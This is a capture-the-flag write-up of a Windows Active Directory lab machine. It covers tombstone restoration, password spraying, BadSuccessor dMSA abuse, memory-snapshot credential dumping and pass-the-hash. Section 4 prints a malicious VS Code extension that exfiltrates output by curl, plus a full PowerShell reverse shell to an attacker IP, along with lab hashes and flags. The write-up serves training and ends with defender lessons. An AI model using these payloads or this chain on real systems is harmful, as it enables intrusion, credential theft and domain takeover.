# [Checkpoint](https://app.hackthebox.com/machines/Checkpoint) - HackTheBox Machines Writeup

```
Box       : Checkpoint
OS        : Windows Server 2025 (reports as "Windows 11" in some tools)
Difficulty: Medium
Target    : 10.129.176.59
Attacker  : 10.10.14.77
```

---

## Attack Path Overview

```
LDAP Enum as alex.turner  >  Writable Tombstone Found (Mark Davies)
        v
Reanimate Mark Davies  >  RW Access to DevDrop SMB Share
        v
Malicious VS Code Extension (.vsix)  >  Shell as ryan.brooks
        v
BadSuccessor (dMSA) Abuse vs svc_deploy  >  svc_deploy NT Hash
        v
VMBackups Share  >  Old VM Memory Snapshot  >  vmkatz  >  Local Administrator Hash
        v
Hash Reuse on Domain Administrator  >  SYSTEM via psexec
        v
EFS-Protected root.txt  >  Reset max.palmer's Password  >  root
```


As is common in real-life pentests, this box starts with a set of valid credentials:
`alex.turner / Checkpoint2024!`

---

## 1. Reconnaissance

```bash
$ nmap -p- -T4 10.129.176.59

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49687/tcp open  unknown
49709/tcp open  unknown
49716/tcp open  unknown
```

Here I can see:

- **DNS (53), Kerberos (88), LDAP (389/636), Global Catalog (3268/3269), SMB (445), WinRM
  (5985), ADWS (9389)**: this combination of ports hints to be of a Windows Active
  Directory Domain Controller.


First, find the domain name so I can address the box properly:

```bash
$ nmap -p389 -sV --script "ldap* and not brute" 10.129.176.59

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
| ldap-rootdse:
|   rootDomainNamingContext: DC=checkpoint,DC=htb
|   ldapServiceName: checkpoint.htb:dc01$@CHECKPOINT.HTB
|   isGlobalCatalogReady: TRUE
```

Alternatively SMB gives us the same answer:

```bash
$ nxc smb 10.129.176.59

SMB   10.129.176.59   445    DC01    [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
```

```bash
$ echo "10.129.176.59 checkpoint.htb dc01.checkpoint.htb DC01" >> /etc/hosts
```

Now check if the given credentials work, and pull a full picture of the domain:

```bash
$ nxc smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
SMB         10.129.176.59   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.176.59   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!

$ nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
LDAP        10.129.176.59   389    DC01   [*] Enumerated 17 domain users: checkpoint.htb
-Username-      -Last PW Set-       -Description-
Administrator   2026-05-09 18:16:34 Built-in account for administering the computer/domain
Guest           <never>             Built-in account for guest access to the computer/domain
krbtgt          2026-05-09 10:41:01 Key Distribution Center Service Account
alex.turner     2026-05-09 11:00:08
ryan.brooks     2026-05-10 15:46:18
svc_deploy      2026-05-09 11:01:19 Deployment service account
james.harper    2026-05-09 11:02:53
sarah.mitchell  2026-05-09 11:02:58
emily.carter    2026-05-09 11:03:05
david.reynolds  2026-05-09 11:03:11
jessica.coleman 2026-05-09 11:03:15
lauren.flores   2026-05-09 11:03:21
michael.torres  2026-05-09 11:03:28
kevin.patterson 2026-05-09 11:03:33
brian.jenkins   2026-05-09 11:03:37
megan.perry     2026-05-09 11:03:42
max.palmer      2026-05-26 03:25:15

$ nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --groups
-Group-             -Members-     -Description-
Administrators      3             Administrators have complete and unrestricted access to the computer/domain
Backup Operators    0             Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Domain Admins       2
Domain Users        0             All domain users
IT-Staff            3
Finance-Staff       2
HR-Staff            2
Engineering-Staff   4
VPN-Users           4
DevTeam             3
DnsAdmins           0             DNS Administrators Group
BackupAccess        1
```

(trimmed output to the only the custom/interesting ones)

The custom groups with elevated-sounding names are worth a closer look. `net rpc` tells us who
belongs to them:

```bash
$ net rpc group members "BackupAccess" -U checkpoint.htb/alex.turner%'Checkpoint2024!' -S checkpoint.htb
CHECKPOINT\svc_deploy

$ net rpc group members "Domain Admins" -U checkpoint.htb/alex.turner%'Checkpoint2024!' -S checkpoint.htb
CHECKPOINT\Administrator
CHECKPOINT\max.palmer

$ net rpc group members "DevTeam" -U checkpoint.htb/alex.turner%'Checkpoint2024!' -S checkpoint.htb
CHECKPOINT\ryan.brooks
CHECKPOINT\michael.torres
CHECKPOINT\brian.jenkins

$ net rpc group members "IT-Staff" -U checkpoint.htb/alex.turner%'Checkpoint2024!' -S checkpoint.htb
CHECKPOINT\alex.turner
CHECKPOINT\james.harper
CHECKPOINT\sarah.mitchell
```

## 2. LDAP Deep Enumeration

Tool of choice from here is `bloodyAD`: `bloodhound-ce-python` and `nxc --bloodhound` both failed for various reasons.

I will use `faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" <cmd>` since the DC's clock runs several hours ahead of my correct kali linux.

```bash
$ ntpdate -q 10.129.176.59
2026-10-14 09:19:22.894769 (+0200) +25193.835430 +/- 0.008145 10.129.176.59 s1 no-leap
```

Checking what alex.turner can write to in the directory:

```bash
$ bloodyad --host 10.129.176.59 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD
```

One entry stands out:

```
distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

This is a deleted/tombstoned user object. Mark Davies is a deleted domain user, and
alex.turner has WRITE on his tombstone. AD does not immediately purge deleted objects, it keeps
them in a tombstone state for a retention period.

## 3. Tombstone Reanimation - Mark Davies

```bash
$ bloodyad --host 10.129.176.59 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb" --attr "*"

cn: Mark Davies
isDeleted: True
lastKnownParent: OU=Employees,DC=checkpoint,DC=htb
sAMAccountName: mark.davies
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
userPrincipalName: mark.davies@checkpoint.htb
```

Restore it:

```bash
$ bloodyad --host 10.129.176.59 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
```

Check what it's actually a member of:

```bash
$ bloodyad --host 10.129.176.59 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get object "CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb" --attr memberOf

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

No group memberships, just a plain domain user. Export all accounts and password-spray
alex.turner's password across them:

```bash
$ nxc ldap dc01.checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users-export users.txt
LDAP        10.129.176.59   389    DC01   [*] Enumerated 18 domain users: checkpoint.htb

$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" nxc ldap DC01.checkpoint.htb -u users.txt -p 'Checkpoint2024!' --continue-on-success
LDAP        10.129.176.59   389    DC01   [+] checkpoint.htb\alex.turner:Checkpoint2024!
LDAP        10.129.176.59   389    DC01   [+] checkpoint.htb\mark.davies:Checkpoint2024!
(all other accounts fail)
```

Password reuse: mark.davies shares alex.turner's password. Check his SMB access:

```bash
$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" nxc smb DC01.checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares

Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
VMBackups
```

**DevDrop** - READ,WRITE, described as a VS Code extensions share for `.vsix` packages. Strong
lead toward a supply-chain attack: if something auto-installs whatever `.vsix` lands here, that's
remote code execution as whoever runs the install process.

**VMBackups** denies mark.davies

```bash
$ smbclient //10.129.176.59/DevDrop -U checkpoint.htb/mark.davies%'Checkpoint2024!' -c 'ls'
  .              D        0  Wed Oct 14 10:17:27 2026
  ..             D        0  Sat May  9 16:42:27 2026
```

Empty, but confirmed writable.

## 4. Initial Access - Malicious VS Code Extension

### 4.1 Test Payload

```javascript
// evil-ext/package.json
{
  "name": "evil-ext",
  "displayName": "evil-ext",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "main": "./extension.js",
  "activationEvents": ["onStartupFinished"],
  "contributes": {}
}

// evil-ext/extension.js
const { exec } = require('child_process');
function activate(context) {
  exec('whoami', (err, stdout) => {
    const user = encodeURIComponent((stdout || 'unknown').trim());
    exec(`curl http://10.10.14.77/hit?user=${user}`);
  });
}
module.exports = { activate };
```

```bash
$ mkdir ~/evil-ext && cd ~/evil-ext
$ npm install -g @vscode/vsce
$ vsce package --allow-missing-repository --skip-license
$ smbclient //10.129.176.59/DevDrop -U checkpoint.htb/mark.davies%'Checkpoint2024!' -c 'put evil-ext-1.0.0.vsix'
```

```
# python3 -m http.server 80
10.129.176.59 - - [14/Oct/2026 03:27:40] "GET /hit?user=checkpoint%5Cryan.brooks HTTP/1.1" 404 -
```

Callback confirmed, executing as `ryan.brooks` (member of DevTeam).

### 4.2 Weaponized Payload - Reverse Shell

I used [revshells.com](https://www.revshells.com/) to gernerate the code.

```javascript
// evil-ext/extension.js
const { exec } = require('child_process');
function activate(context) {
  exec('powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.14.77\',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"');
}
module.exports = { activate };
```

```bash
$ vsce package --allow-missing-repository --skip-license
$ smbclient //10.129.176.59/DevDrop -U checkpoint.htb/mark.davies%'Checkpoint2024!' -c 'put evil-ext-1.0.0.vsix'
```

```bash
$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.77] from (UNKNOWN) [10.129.176.59] 54350

PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
```

Shell as `ryan.brooks`.

## 5. Post-Exploitation as ryan.brooks

```
PS C:\Program Files\Microsoft VS Code> whoami /priv

Privilege Name                Description                    State
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\Program Files\Microsoft VS Code> whoami /groups

CHECKPOINT\VPN-Users   Group
CHECKPOINT\DevTeam     Group
```

No useful privileges or groups directly.

```
PS C:\Program Files\Microsoft VS Code> type C:\Users\ryan.brooks\Desktop\user.txt
bece7d5ed0b523480e7a0460631ccf5f
```

`systeminfo` confirms the Server 2025 build:

```
PS C:\Program Files\Microsoft VS Code> systeminfo

Host Name:                     DC01
OS Name:                       Microsoft Windows Server 2025 Standard
OS Version:                    10.0.26100 N/A Build 26100
OS Configuration:              Primary Domain Controller
System Manufacturer:           VMware, Inc.
Domain:                        checkpoint.htb
```

And a script that explains how DevDrop is actually consumed:

```powershell
PS C:\Program Files\Microsoft VS Code> Get-Content C:\Scripts\vscodesync.ps1

$shareDir = "C:\Shares\DevDrop"
$codeCli  = "C:\Program Files\Microsoft VS Code\bin\code.cmd"

$vsixFiles = Get-ChildItem -LiteralPath $shareDir -Filter *.vsix -File -ErrorAction SilentlyContinue
foreach ($vsix in $vsixFiles) {
    & $codeCli --install-extension $vsix.FullName --force
}
Start-Process -FilePath "C:\Program Files\Microsoft VS Code\Code.exe" -ArgumentList "--no-sandbox"
```

Confirms exactly the mechanism abused above: anything dropped as `.vsix` into
`C:\Shares\DevDrop` gets force-installed into VS Code, which runs as ryan.brooks.

## 6. Privilege Escalation - BadSuccessor (dMSA)

### 6.1 Background

A search for "Windows Server 2025 exploit" turns up BadSuccessor, abuse of the new delegated
Managed Service Account (dMSA) feature. A dMSA exists to make service account migration painless:
point a new dMSA at a legacy account, flip a state attribute, and the KDC treats the dMSA as the
successor. It issues tickets carrying the predecessor's identity and hands over the
predecessor's current Kerberos keys so in-flight sessions don't break.

The vulnerability: the KDC used to trust the dMSA's own claim
(`msDS-ManagedAccountPrecededByLink` + `msDS-DelegatedMSAState=2`) with nothing else required, so
anyone with `CREATE_CHILD` rights on an OU could mint a dMSA claiming to succeed Administrator.

### 6.2 First Attempt Fails - Administrator

```bash
$ bloodyad --host 10.129.176.59 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  add badSuccessor -t 'CN=Administrator,CN=Users,DC=checkpoint,DC=htb' \
  --ou 'OU=Employees,DC=checkpoint,DC=htb' evil_dmsa

[+] Creating DMSA evil_dmsa$ in OU=Employees,DC=checkpoint,DC=htb
[+] Impersonating: CN=Administrator,CN=Users,DC=checkpoint,DC=htb
LDAPModifyException: insufficientAccessRights (ERROR_DS_INSUFF_ACCESS_RIGHTS)
```

### 6.3 A Kerberos Ticket for ryan.brooks

ryan.brooks only has an interactive reverse shell, no known password, so to query his own LDAP
rights I first need a usable Kerberos ticket for him. Rubeus' `tgtdeleg` abuses fake delegation
to get one without ever knowing his credentials:

```bash
$ apt install rubeus
$ rubeus

> rubeus ~ Raw Kerberos interaction and abuses

/usr/share/windows-resources/rubeus
├── Rubeus.exe
├── Windows Server 2019-Snapshot1.vmem
└── Windows Server 2019-Snapshot1.vmsn

$ python3 -m http.server 8080
```

```powershell
PS C:\Windows\Temp> Invoke-WebRequest -Uri http://10.10.14.77:8080/Rubeus.exe -OutFile C:\Windows\Temp\Rubeus.exe
PS C:\Windows\Temp> .\Rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)
[+] Delegation requset success!
[*] base64(ticket.kirbi):
    doIF1DCCBdCg... (trimmed)
```

```bash
$ echo "<base64 kirbi>" > ryan_brooks.b64
$ base64 -d ryan_brooks.b64 > ryan_brooks.kirbi
$ impacket-ticketConverter ryan_brooks.kirbi ryan_brooks.ccache
$ export KRB5CCNAME=ryan_brooks.ccache
```

### 6.4 Second Attempt Succeeds - svc_deploy

Enumerate ryan.brooks' own writable objects:

```bash
$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k get writable

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE
```

Exactly what's needed: `CREATE_CHILD` on `OU=DMSAHolder` to mint the dMSA, and `WRITE` directly
on `CN=svc_deploy` to complete the mutual pairing.

```bash
$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" bloodyad --host DC01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k \
  add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'

[+] Creating DMSA evil-dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
[+] dMSA TGT stored in ccache file evil-dmsa_uw.ccache

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

The "previous keys" entry is svc_deploy's actual NT hash, handed over as part of the dMSA
migration mechanism.

**svc_deploy NT hash: `e16081eb077aca74bdbf8af12af43ac9`**

```bash
$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" nxc winrm DC01.checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
WINRM       10.129.176.59   5985   DC01   [+] checkpoint.htb\svc_deploy:e16081eb077aca74bdbf8af12af43ac9 (Pwn3d!)

$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" evil-winrm -i checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami
checkpoint\svc_deploy
```

## 7. svc_deploy - VMBackups and Memory Forensics

svc_deploy is a member of `BackupAccess`.

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> ls C:\Shares\

Mode   LastWriteTime         Length Name
----   -------------         ------ ----
-a---- 10/19/2026 1:17 PM           DevDrop
-a---- 5/9/2026  10:15 PM           VMBackups
```

Looking around I found a Backup.

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> cd C:\Shares\VMBackups\NightlyBackup_2024-11-01\'memory forensics'
*Evil-WinRM* PS ...\memory forensics> ls

Mode   LastWriteTime         Length Name
----   -------------         ------ ----
-a---- 5/9/2026 7:45 PM  106496000 Windows Server 2019-000001.vmdk
-a---- 5/9/2026 7:40 PM 2147483648 Windows Server 2019-Snapshot1.vmem
-a---- 5/9/2026 7:40 PM  138164859 Windows Server 2019-Snapshot1.vmsn
```

A VMware snapshot of an old Windows Server 2019 box: `.vmem` (full memory, 2 GB) and `.vmsn`
(snapshot state, 131 MB). Volatility2 and Volatility3 both ran into environment/symbol issues
against this image. Switched to `vmkatz`, which pulls credentials out of VMware snapshot files:

```bash
$ wget https://github.com/nikaiw/VMkatz/releases/download/v1.5.1/vmkatz-v1.5.1-windows-x86_64.zip
$ unzip vmkatz-v1.5.1-windows-x86_64.zip
$ python3 -m http.server 8080
```

```powershell
PS ...\memory forensics> Invoke-WebRequest -Uri http://10.10.14.77:8080/vmkatz.exe -OutFile C:\Windows\Temp\vmkatz.exe
PS ...\memory forensics> C:\Windows\Temp\vmkatz.exe "Windows Server 2019-Snapshot1.vmsn"
```

```
[*] vmkatz v1.5.1
[*] Recovering registry hives via CM hive-map...
[+] Bootkey: 75247bc64fa0086d2c98744d4bcd53f5
[+] SAM Hashes:
  RID: 500   Administrator   NT:f29e9c014295b9b32139b09a2790be3b

[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
```

**Local Administrator NT hash from the old DC's memory: `f29e9c014295b9b32139b09a2790be3b`**

## 8. Domain Takeover

Worth trying against the live domain Administrator.

```bash
$ nxc smb checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
SMB   10.129.176.59   445    DC01   [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
```

It's reused. Pass-the-hash to a full SYSTEM shell:

```bash
$ faketime "$(ntpdate -q DC01 | cut -d ' ' -f 1,2)" impacket-psexec checkpoint.htb/Administrator@DC01.checkpoint.htb -hashes :f29e9c014295b9b32139b09a2790be3b -dc-ip 10.129.176.59

C:\Windows\System32> whoami
nt authority\system
```

root.txt exists but is EFS-encrypted.

```
C:\Windows\System32> dir C:\Users\max.palmer\Desktop
10/18/2026  03:24 PM                34 root.txt

C:\Windows\System32> type C:\Users\max.palmer\Desktop\root.txt
Access is denied.

C:\Windows\System32> cipher /c "C:\Users\max.palmer\Desktop\root.txt"
U root.txt
```

Only the encrypting user (max.palmer) or a recovery agent can.
Since I'm SYSTEM, just reset his password directly:

```
C:\Windows\System32> net user max.palmer NewPassword
The command completed successfully.
```

```bash
$ evil-winrm -i checkpoint.htb -u max.palmer -p 'NewPassword'
```

```
*Evil-WinRM* PS C:\Users\max.palmer\Documents> type ../Desktop/root.txt
05c165ce2f697ac147d2a5dcd68749a1
```

## Lessons Learned

**For defenders:**

- **Deleted AD objects stay recoverable.**
- **Password reuse across accounts.** mark.davies and alex.turner shared a password, and the
  local Administrator hash on an old VM was still valid on the live domain Administrator.
- **Auto-install pipelines are code execution as whoever runs them.** The DevDrop ->
  vscodesync.ps1 -> VS Code chain had no signing or source verification on `.vsix` files.
- **Newly releases software can ship with crucial bugs.** dMSA (Windows Server 2025) initially allowed
  one-sided impersonation of any account with just `CREATE_CHILD` on an OU.
- **Old backups can hold credentials that are still useable.** A years-old VM snapshot sitting on a
  backup share handed over a hash that still worked.

**What I learned**

- **BadSuccessor (dMSA abuse).** First time exploiting the Windows Server 2025, including the 
  Rubeus `tgtdeleg` trick to get a usable ticket for a user with only shell access and no known password.
- **vmkatz.** tool for pulling credentials out of VMware snapshot as an alternative to Volatility.

**Tools I used**

- nmap
- netexec (nxc)
- bloodyAD
- Rubeus
- impacket (ticketConverter, psexec)
- vmkatz
- evil-winrm
